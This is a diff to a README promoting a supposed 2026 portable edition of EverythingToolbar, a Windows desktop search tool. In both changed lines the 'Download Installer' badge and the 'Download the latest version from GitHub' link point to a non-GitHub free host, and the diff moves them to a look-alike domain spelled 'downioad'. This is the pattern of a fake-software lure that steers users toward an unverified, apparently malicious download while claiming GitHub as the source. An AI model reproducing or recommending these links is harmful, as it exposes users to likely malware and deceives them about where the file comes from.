@@ -2,7 +2,7 @@
 
 EverythingToolbar is a powerful and lightweight tool designed to enhance your Windows desktop search experience. It integrates seamlessly with the Everything search engine, providing instant access to files and folders on your Windows 10 or Windows 11 system. This portable version for 2026 requires no installation and can be run directly from any location.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -54,7 +54,7 @@ A: Since it's portable, simply delete the installation folder. No uninstaller is
 
 To get the latest version of EverythingToolbar 2026 Portable Edition, visit the download page below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
